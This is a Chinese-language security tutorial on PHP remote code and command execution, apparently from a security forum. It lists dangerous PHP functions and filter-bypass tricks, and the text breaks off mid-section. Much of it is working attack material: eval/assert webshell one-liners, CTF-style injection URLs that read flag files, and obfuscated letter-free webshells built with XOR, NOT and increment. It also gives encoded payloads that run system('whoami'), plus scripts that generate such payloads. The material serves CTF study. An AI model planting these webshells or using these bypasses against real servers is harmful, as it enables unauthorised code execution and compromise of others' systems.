前言
--

这篇文章实际上是我个人的一个关于RCE漏洞学习的总结，由命令执行以及代码执行的函数入口，对整个RCE漏洞进行了学习。  
同时对RCE漏洞利用时的种种绕过进行了一个总结，包括各种字符、关键字，以至无数字字母、无参数等更进阶一点的情况。

希望能对大家的学习起到一定的帮助，如有不足指出请指正~

**声明：本文介绍的技术仅供网络安全技术人员及白帽子使用，任何个人或组织不可传播使用相关技术及工具从事违法犯罪行为，一经发现直接上报国家安全机关处理**

RCE漏洞介绍
-------

**RCE(Remote Code/Command Execute)远程代码/命令执行：**是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。

**漏洞产生原因：**在Web应用中开发者为了灵活性，简洁性等会让应用调用代码或者系统命令执行函数去处理,同时没有考虑用户的输入是否可以被控制，造成代码/系统命令执行漏洞

**漏洞产生条件：**可控变量，漏洞函数

**常见场景\*\***：\*\*

- 使用了危险函数的Web应用
- 低版本的Java语言Struts框架
- etc.

### 漏洞函数

重点就在命令执行函数或者代码执行函数这里，PHP执行系统命令的有几个常用的函数,如：**system函数**、**exec函数**、**popen函数**、**passthru、shell\_exec函数**等，而PHP中常见的代码执行命令则有像： **eval()** 、 **assert()** 、 **preg\_replace()** 、**${}**等，区别就在于命令中传入的参数值，是系统命令或是PHP代码。

现在我们先来总结一下PHP中的这两种函数：

#### PHP命令执行函数

1. **system()**  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bfa161bb682057342346e8ad9ba0565f4dff4cc7.png)  
    system — 执行外部程序(命令行)，并且**显示输出**  
    这个函数会将结果直接进行输出 (注意：是直接输出区别于返回值，因为这个，我一般不用它)， **命令成功后返回输出的最后一行** ，失败返回FALSE。
2. **shell\_exec()**  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-549d6b99ca26fd22575385408de628b4c7a0de40.png)  
    可以看到没有被执行  
    shell\_exec — 通过 shell 环境执行命令**，并且将完整的输出以字符串的方式返回** 。如果执行过程中发生错误或者进程不产生输出，则返回 NULL。  
    而且，php默认不给执行shell，要关掉安全模式，要在php.ini中注释掉`disable_function:`一行。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db3c4fe6b85167351eef5a97a051fe927321e49e.png)
3. **exec()**  
    执行一个外部程序，返回命令执行结果的最后一行内容。 **不显示回显** 。如果想要获取命令的输出内容， 请确保使用 output 参数，或者利用这个函数来构建反弹shell。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66f783ede215944135602ed8913f777569b2c781.png)
4. **passthru()**  
    passthru — 执行外部程序并且 **显示原始输出** 。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dbe512024c7242dfb14d85a99c92fb1d83d3bb42.png)  
    **一些奇怪一点的：**
5. **反引号**
    
    ```·
    `命令`
    ```
    
    反引号可以用来在PHP代码中直接执行系统命令，但是想要回显的话还是需要一个 `echo`，当然不止echo，其他外带信息输出信息的方式也可以，这里有个叫法叫内联执行
    
    > 大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的反引号作**指令替代**，意思是以某一个指令的输出结果**作为另一个指令的输入项**。linux下反引号里面包含的就是需要执行的系统命令，**而反引号里面的系统命令会先执行，成功执行后将结果传递给调用它的命令(就是将反引号内命令的输出作为输入执行)，类似于|管道**，这个就是内联执行。
    
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-67dd0e9d913c2990e17c2101be79e4cf4ba61071.png)
6. **花括号**  
    花括号下要是执行没有参数的命令也要有一个`,` 有参数的话直接在后面跟参数  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-88d71db8d577bafc341d0293c82e5a4e2ef241a1.png)  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0d4ef8e132b9dd48c84fcf12f4476bb7e6b699ff.png)
7. **echo**  
    echo在PHP中还是要结合反引号来进行命令执行，但是在linux中还可以进行变种的、在文件里输出的操作，相当于写文件操作，如果不经过严格过滤的话可以进行PHP一句话木马的写入。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-98e5e4cee26bbdbfc57d8f8bef04ed95dd3dabd5.png)
8. **命令拼接符**  
    linux下：
    
    ```php
    command1 ; command2 : 先执行command1后执行comnand2
    command1 & command2 : 先执行comnand2后执行command1
    command1 && command2 : 先执行command1后执行comnand2
    command1 | command2 : 只执行command2
    command1 || command2 : command1执行失败， 再执行command2(若command1执行成功，就不再执行command2)
    %0a（回车符）、%0d（换行符），这两个也可以起到运行下一个命令的作用
    ```
    
    windows下：
    
    ```php
    %0a、&、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）
    ```

#### PHP代码执行函数

代码执行漏洞和命令执行漏洞的区别不大，主要是输入内容的区别，命令执行直接执行的就是系统命令，而代码执行则是执行的PHP代码。

1. **eval()**  
    不演示了，最常见的一句话木马利用的不就是eval么？可以执行各种各样的PHP函数。
2. **assert()函数**
    
    ```php
    assert ( mixed $assertion [, Throwable $exception ] )
    ```
    
    assert函数在简单的代码执行中**简单的看**就是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然加上也可以。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05e040f1c9dc56b3d2875f54a1748a0cdff0d86e.png)  
    但是其实这里涉及到了assert作为断言函数的一个漏洞，编写代码时，我们总是会做出一些假设，断言就是用于在代码中捕捉这些假设，可以将断言看作是异常处理的一种高级形式。**程序员断言在程序中的某个特定点该的表达式值为真(为真才能继续执行)。如果该表达式为假，就中断操作。**  
    **漏洞：如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。跟eval()类似。这是一种代码执行。**
3. **preg\_replace()**  
    preg\_replace('正则规则','替换字符'，'目标字符')  
    将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d0187714db48191594379836bfc131271256500e.png)> /e 修饰符使 preg\_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg\_replace() 的行中出现语法解析错误。
    > 
    > /e修饰符是 **不推荐使用的正则表达式修饰符** ，它允许您在正则表达式中使用PHP代码。这意味着您解析的任何内容都将被评估为您的程序的一部分。
4. **create\_function()函数**  
    根据传递的参数创建匿名函数，并为其返回唯一名称。
    
    ```stata
    create_function(string $args, string $code): string
    ```
    
    通常，这些参数将作为单引号分隔的字符串传递。使用单引号字符串的原因是为了防止解析变量名，否则，如果使用双引号，则需要转义变量名，例如\\$avar。  
    分析一下就会是这样的：
    
    > 1. 获取参数, 函数体;
    > 2. 拼凑一个`function __lambda_func (参数) { 函数体;}`的字符串;
    > 3. `eval;`
    > 4. 通过\_\_lambda\_func在函数表中找到eval后得到的函数体, 找不到就出错;
    > 5. 定义一个函数名:”\\000*lambda*” . count(anonymous\_functions)++;
    > 6. 用新的函数名替换\_\_lambda\_func;
    > 7. 返回新的函数。
    
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4235f53302029f3620444041f6c9258f440717ef.png)  
    这是PHP手册上的第一个例子， 我们可以看到这里创造了一个名为lambda的function，这里叫46是因为我之前已经做过一些实验了，我们把它构造器的函数体分析一下的话就是：
    
    ```php
    function lambda_46($a,$b){
    return "ln($a) + ln($b) = " . log($a * $b);
    }
    ```
    
    其中M\_E就是高中学的那个自然数，2.71828。  
    这里这个函数还是比较安全的，把参数都包进了函数内，但是如果使用不当，任意代码执行漏洞就要诞生了。举个例子：  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-538c1d4ebc2e2f574d34637bca5c2992e236adc7.png)  
    `/*`注释掉了后面所有的内容，}又与前面的函数构造完成了闭合，这样，我们的phpinfo命令相当于就是在拼接下被eval执行了。  
    同样creat\_function()也能构造一句话木马
    
    ```php
    <?PHP $func=creat_function('',$_POST['cmd']);$func();?>
    ```
    
    从PHP7.2.0开始，该函数被废弃。
5. **array\_map()函数**  
    为数组的每个元素应用回调函数  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ba53f1e0c8ddb202d7b7e5f0e47393728962ee99.png)  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-39353b8ebcd158614dc7b0b60281dafca4875574.png)  
    或者，看个人对PHP代码的理解了  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d3703dc2f8bd523e937ce2681e53c330cf59e3ed.png)  
    也可以作为一句话木马进行链接 ```php
    http://localhost/123.php?func=assert   密码：cmd
    ```
6. **call\_user\_func()**  
    也是一种回调函数，把第一个参数当作回调函数调用，和上面的array\_map()利用方式一样。
7. **call\_user\_func\_array()**  
    调用回调函数，并把一个数组参数作为回调函数的参数.
8. **array\_filter()**  
    使用回调函数过滤数组的元素
9. **uasort()**  
    使用用户自定义的比较函数对数组中的值进行排序并保持索引关联，已弃用。
10. **`${}`执行代码**  
    在PHP语言中，单引号和双引号都可以表示一个字符串，但是 **对于双引号来说，可能会对引号内的内容进行二次解释** ，这就可能会出现安全问题。  
    举个简单的例子：
    
    ```php
    <?php
    $a = 1;
    $b = 2;
    echo '$a$b';//输出结果为$a$b
    echo "$a$b";//输出结果为12
    ?>
    
    ```
    
    同样**在 "双引号" 中倘若有`${}`出现** ，那么{}内的内容将被当做php代码块来执行。  
    ![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-34401a2444f4aa376564ddf63dc1e3bad0154021.png)  
    代码后面不加`;`

##### POST时

代码执行里的POST非常别扭，你直接打命令行里的命令的时候通常都会报错，这个时候就需要我们用一些巧妙地方式，比如`include($_GET['1']);`、再比如`show_source('flag.php');`，巧妙地利用一些PHP的方法来进行目标数据的获取。

绕过！
---

### 常见绕过

这里是一些常见的绕过方式，不只是在RCE当中，大部分的漏洞里的绕过其实是换汤不换药的。RCE这里有些不同的地方就在于，因为是要命令执行，它还牵扯到了很多命令行中的方法来进行绕过。

#### str\_replace()

常见的类似于`str_replace('flag','')`的过滤我们可以使用双写绕过。`flflagag`把中间的flag替换为空之后还是flag。

#### 过滤空格

一些命令，像`cat /flag`是一定要用到空格的，如果没法输入空格就会导致我们没法执行命令。

```php
< 、<>、%09(tab)、%20、$IFS$9、$IFS$1、${IFS}、$IFS等，还可以用{} 比如 {cat,flag}
```

> **$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。**

还有一些编码绕过或者编码后在`{}`中的也可以通过`{,}`绕过空格

#### 过滤分号

过滤分号的时候我们可以通过?&gt;闭合来使我们的命令执行，然后可以使用include""包含，而且不用双引号也可以，执行一些我们的命令。

但是我们可以发现这个时候是不会回显的，我们可以结合伪协议来进行回显的读取。

![image.png](https://b3logfile.com/siyuan/1621238442570/assets/image-20211027100149-4ztyc8m.png)

### 敏感字符绕过

#### 利用编码绕过敏感字符

##### URL编码绕过

关于`$_SERVER['QUERY_STRING']`，它**验证的时候**是不会进行url解码的，但是在GET的时候则会进行url解码，所以我们只需要将关键词进行url编码就能绕过。

这里涉及到这个`$_SERVER['QUERY_STRING']`，属于PHP中`$_SERVER`这个全局变量的一种，

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a4f10df302c26eb1048423fd791c025a3eab58df.png)

##### BASE64编码绕过

linux下base64命令用法：

```php
base64 [选项]… [文件]
使用 Base64 编码/解码文件或标准输入/输出。
-d, --decode 解码数据
-w, --wrap=字符数 在指定的字符数后自动换行(默认为76)，0 为禁用自动换行
```

利用时要结合管道符

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2ab8d9efe5a10994dc86332d00657dd4469ef66f.png)

> 第一个流行的shell是由Steven Bourne 发展出来的，为了纪念它就称为Bourne shell，或直接简称为**sh**
> 
> 而Linux使用的版本为Bourne Again SHell 简称为 **bash** ，这个shell是Bourne shell 的 **增强版本** 。

##### Hex编码绕过

道理其实与上面base相同

利用linux **xxd**命令。xxd 命令可以将指定文件或标准输入以十六进制转储，也可以把十六进制转储转换成原来的二进制形式。

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-069cb5991c73e883a3ca5010342776b8af0c96a0.png)

**-r参数：逆向转换**，将16进制字符串表示转为实际的数。

-p这里就表示打印，显示出来，但是不-p的话就没有办法执行命令

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e8a0b820c5d4a2a1fd4ab9bcb4ba3e95f609a199.png)

也可以用 `$()` 的形式直接**内联执行**：

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f888979d8aadc94e8bac9c6e2a9850e066002c4a.png)

关于内联执行这个概念在上面的反引号处有讲，这里我们可以通过内联执行printf函数来解码hex编码

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-904d140ca2c54c606d16a75fee86791c3a9b9b3e.png)

##### Oct编码绕过

和上面这种hex类似，也是利用的printf和内联执行

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f1e46c3068edc3e92d001e77f96e576ba4cbcefd.png)

#### 拼接绕过

##### 偶读拼接绕过

也不太明白“偶读”到底是个什么术语，差不多就是把一个参数定义成好几个参数，然后一块使用就相当于绕过了的意思吧。

```php
a=l;b=s;$a$b
a=fl;b=ag;cat $a$b
```

##### 利用.拼接来进行绕过

```php
(sy.(st).em)
```

其实不太知道这个能用在哪里

#### 用引号绕过

我们可以用引号绕过对关键字的过滤

```php
ca""t  =>  cat
mo""re  =>  more  
in""dex  =>  index
ph""p  =>  php
```

#### 用通配符绕过

可以看到，题目使用 `preg_match("/.*f.*l.*a.*g.*/", $ip)` 过滤了flag，那么我们读取flag时就可以用以下方法绕过：

```php
假设flag在/flag中:
/?url=127.0.0.1|ca""t%09/fla?
/?url=127.0.0.1|ca""t%09/fla*

假设flag在/flag.txt中:
/?url=127.0.0.1|ca""t%09/fla????
/?url=127.0.0.1|ca""t%09/fla*

假设flag在/flags/flag.txt中:
/?url=127.0.0.1|ca""t%09/fla??/fla????
/?url=127.0.0.1|ca""t%09/fla*/fla*
```

下面说一下原理：

在正则表达式中，?这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或一次。  
在shell命令行中，? 这样的通配符与其它字符一起组合成表达式，匹配任意一个字符。  
同理，我们可以知道`*` 通配符：

在正则表达式中，`*`这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或多次。  
在shell命令行中，`*`这样的通配符与其它字符一起组合成表达式，匹配任意长度的字符串。这个字符串的长度可以是0，可以是1，可以是任意数字。&lt;br /&gt;

当然通配符不止如此，P牛的文章里有崭新的利用通配符的方式，下面会讲。

#### 用反斜杠绕过

反斜杠`\`（区分路径`/`，linux下，windows下路径就是用的反斜杠）在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。

也就意味着，我们可以在rce漏洞，过滤掉`cat`、`ls`等命令时，使用`ca\t`来实现绕过

#### 用\[\]匹配绕过关键字过滤

```php
c[a]t  =>  cat
mo[r]e  =>  more  
in[d]ex  =>  index
p[h]p  =>  php
```

### 无回显RCE

没有回显加上命令执行的话很容易就能想到反弹shell，命令本来就该在命令行里嘛。

具体的反弹shell应该去和whoami取一下经：<https://xz.aliyun.com/t/9488>

### 无数字字母webshell

经典的过滤代码

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
eval($_GET['shell']);
}
```

#### 小知识点

##### PHP短标签

我们知道`<?PHP ?>`是PHP的标签，里面的内容会被当作PHP代码的内容。但是由于含有PHP，我们过滤所有数字字母的时候同样会过滤掉它。

此时我们就要使用我们的PHP短标签了，并且在短标签中的代码不需要使用分号。

```php
<? ?> //相当于<?PHP ?>
<?= ?> //相当于<?PHP echo ... ?>
```

例证上面的`<?= ?>`

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a5a6e36c845da189cd32b92eed4191df2eb794a4.png)

##### PHP5和PHP7的区别

1. 在 PHP 5 中，`assert()`是一个函数，我们可以用`$_=assert;$_()`这样的形式来实现代码的动态执行。但是在 PHP 7 中，`assert()`变成了一个和`eval()`一样的语言结构，不再支持上面那种调用方法。（但是好像在 PHP 7.0.12 下还能这样调用）
2. PHP5中，是不支持`($a)()`这种调用方法的，但在 PHP 7 中支持这种调用方法，因此支持这么写`('phpinfo')();`。

#### 异或

这里就是P牛的第一种方法。

在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到**某两个非字母、数字的字符**，他们的异或结果是这个字母即可。

得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
/*这里的整个拼接流程还是比较简单的*/
```

下面是忘记了从哪里扒的一个可以打印出来各种字符异或的脚本

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1fc95626400c502d858e1cc50e6c325758204c07.png)

```php
<?php
    $myfile=fopen("xor_rce.txt","w");
    $contents="";
    for($i=0;$i<256;$i++){
        for($j=0;$j<256;$j++){
            if($i<16){
                $hex_i='0'.dechex($i);
            }
            else{
                $hex_i=dechex($i);
            }
            if($j<16){
                $hex_j='0'.dechex($j);
            }
            else{
                $hex_j=dechex($j);
            }
            $preg='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';    // 根据题目给的正则表达式修改即可
            if(preg_match($preg,hex2bin($hex_i))||preg_match($preg,hex2bin($hex_j))){
                echo "";
            }
            else{
                $a='%'.$hex_i;
                $b='%'.$hex_j;
                $c=(urldecode($a)^urldecode($b));
//                此处范围是将按位或运算得到的字符限定在可见字符范围内
                if(ord($c)>=32&ord($c)<=126){
                    $contents=$contents.$c." ".$a." ".$b."\n";
                }
            }
        }
    }
    fwrite($myfile,$contents);
    fclose($myfile);
?>
```

根据这个脚本打印一下参与异或的两个参数和异或出来的字符，然后根据我们的需求去进行查找就可以了，注意一下格式，别漏`;`之类的必备符号。这里还有一个配套的python的脚本，用来查找我们的需求字符。

```php
#!/usr/bin/python
# -*- coding: UTF-8 -*-

import requests
import urllib
from sys import *
import os

def action(arg):
    s1=""
    s2=""
    for i in arg:
        f=open("xor_rce.txt","r")
        while True:
            t=f.readline()
            if t=="":
                break
            if t[0]==i:
                # print(i)
                s1+=t[2:5]
                s2+=t[6:9]
                break
        f.close()
    output="(\""+s1+"\"^\""+s2+"\")"
    return(output)

while True:
    param=action(input("\n[+] your function: "))+action(input("[+] your command: "))+";"
    print('\n',param)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c8b834b5e7f7add5fc87adda600eda3b56a7dd3b.png)

#### 取反

这里是P牛的方法二，和方法一有异曲同工之妙，唯一差异就是，方法一使用的是**位运算**里的“异或”，方法二使用的是**位运算里**的“取反”。

方法二**利用的是UTF-8编码的某个汉字**，并**将其中某个字符取出来**，比如`'和'{2}`的结果是`"\x8c"`，其取反即为字母`s`：

```php
echo ~('瞰'{1});    // a
echo ~('和'{2});    // s
echo ~('和'{2});    // s
echo ~('的'{1});    // e
echo ~('半'{1});    // r
echo ~('始'{2});    // t
```

随机选择了一些汉字之后得到了如下的姿势

```php
$__=('>'>'<')+('>'>'<');    // $__=2, 利用PHP的弱类型的特点获取数字
$_=$__/$__;    // $_=1

$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__}); // $____=assert

$_____=_;$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});  // $_____=_POST

$_=$$_____;  // $_=$_POST
$____($_[$__]);  // assert($_POST[2])
```

太强了，属实是把PHP玩明白了。

#### URL 编码取反绕过

刚才我们介绍的是通过取反汉字来得到我们想要的字母，我们还可以直接对一串恶意代码进行取反然后 URL 编码，在发送 Payload 的时候再次将其取反便可将代码还原，然后将其动态执行。并且，因为是取反，基本上用的都是不可见字符，所以不会触发到正则表达式。

假设我们要构造一个`phpinfo();`，由于因为没有过滤括号，所以只需要先取反再编码字符串 "phpinfo" 就行了：

```php
echo urlencode(~'phpinfo');
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b1e6cb79b1d74fd74e9ace6630ab4fff3844430a.png)

然后再补上括号等就可以代码执行了，`phpinfo()`是没有参数的，如果需要执行有参数的函数的话，比如`system('ls /');`，则应分别对其中的字符进行编码：

```php
(~%8F%97%8F%96%91%99%90)();    // phpinfo();
(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);  //system(ls /);
```

抄whoami神一个脚本

```php
<?php
//在命令行中运行

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d381906cce50707f9c12842a8425bb6150cdabed.png)

#### 或

P牛师傅没玩这个，他位运算玩腻了，这个其实和勤勉的异或和取反一样，都是基于PHP再位运算中的特性形成的特点。

```python
<?php

$myfile = fopen("or_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }else{
            $hex_j=dechex($j);
        }
        $preg = '/[0-9a-z]/i';    //根据题目给的正则表达式修改即可
if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
    echo "";
}else{
    $a='%'.$hex_i;
    $b='%'.$hex_j;
    $c=(urldecode($a)|urldecode($b));
    if (ord($c)>=32&ord($c)<=126) {
    $contents=$contents.$c." ".$a." ".$b."\n";
    }
}
}
}
fwrite($myfile,$contents);
fclose($myfile);
```

然后和异或一样写脚本查找

```python
def action(arg):
    s1=""
    s2=""
    for i in arg:
        f=open("or_rce.txt","r")
        while True:
            t=f.readline()
            if t=="":
                break
            if t[0]==i:
                # print(i)
                s1+=t[2:5]
                s2+=t[6:9]
                break
        f.close()
    output="(\""+s1+"\"|\""+s2+"\")"
    return(output)

while True:
    param=action(input("\n[+] your function: "))+action(input("[+] your command: "))
    print('\n',param)
```

#### 自增绕过

首先看文档，PHP中的自增有一个小特性。

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-20a855c70c63e8fb1193fca5082de7f8eb126f8e.png)

也就是说，`'a'++ => 'b'`，`'b'++ => 'c'`... 所以，我们只要能拿到一个变量，其值为`a`，通过自增操作即可获得a-z中所有字符。

那么，如何拿到一个值为字符串'a'的变量呢？

巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。

**在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串**，其值为`Array`：

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e23e5184743cf049401dd1050db39f282d2b6ca8.png)

再取这个字符串的第一个字母，就可以获得'A'了。

利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是`ASSERT($_POST[_])`，无需获取小写a）：

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

缩减后即，使用时需要进行一次URL编码，shell为`_`

```php
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

### 无数字字母webshell之字符被过滤

#### \_ 被过滤

在前文中我们可以看到，很多 Payload 的构造都用到了下划线`_`作为变量名。但即便是下划线`_`被过滤了，我们也根本无需担心，因为我们本就可以不用`_`。

- **比如我们前面的像下面那几种 Payload 就没有用到`_`：**

```php
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08%00%00"^"%60%7b%20%2f");//xor
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13%00%00"|"%60%60%20%2f");//or
(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);//URL取反
```

- **再来看看另一个师傅用过这样的 Payload，也可以绕过，而且效果极好：**

```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

解释一下这个师傅的绕过手法：

```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo

即: 
${_GET}{%ff}();&%ff=phpinfo//?shell=${_GET}{%ff}();&%ff=phpinfo
```

> 先解释一下这里的%ff：
> 
> 任何字符与 0xff 异或都会取相反，这样就能减少运算量了。 注意：测试中发现，传值时对于要计算的部分不能用括号括起来，因为括号也将被识别为传入的字符串，可以使用`{}`代替，原因是 PHP 的 use of undefined constant 特性。例如`${_GET}{a}`这样的语句 PHP 是不会判为错误的，因为`{}`是用来界定变量的，这句话就是会将`_GET`自动看为字符串，也就是`$_GET['a']`。`${_GET}{%ff}`后面那个`()`为的是能够动态执行传入的 PHP 函数。

如果想要执行带参数的函数比如`system('whoami')`，那我们可以对后面括号里的参数做相同的编码处理：

```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff^%88%97%90%9E%92%96);&%ff=system
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=readfile
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=highlight_file

// 即: 
// ${_GET}{%ff}('whoami');&%ff=system
// ${_GET}{%ff}('flag.php');&%ff=readfile
// ${_GET}{%ff}('flag.php');&%ff=highlight_file
```

同理，我们也可以直接进行取反：

```php
${~%A0%B8%BA%AB}{%ff}();&%ff=phpinfo
${~%A0%B8%BA%AB}{%ff}(~%88%97%90%9E%92%96);&%ff=system
```

**此外，继承于上述原理，我们还可以直接使用反引号执行命令：**

```php
?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=ls /
```

分析下这个 Payload：

```php
?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=ls /
即: 
?><?PHP echo `$_GET[%ff]`?>&%ff=ls /
```

最开头的`?>`闭合了 eval() 函数自带的`<?`标签。接下来使用了短标签代替`<?php echo ... ?>`。`{}`里面包含的 PHP 代码可以被执行，`~%A0%B8%BA%AB`为`_GET`，最后将通过参数`%ff`传入的值使用反引号进行命令执行。

#### ；被过滤

这个就很无所谓了，短标签是不需要分号的。

#### $ 被过滤

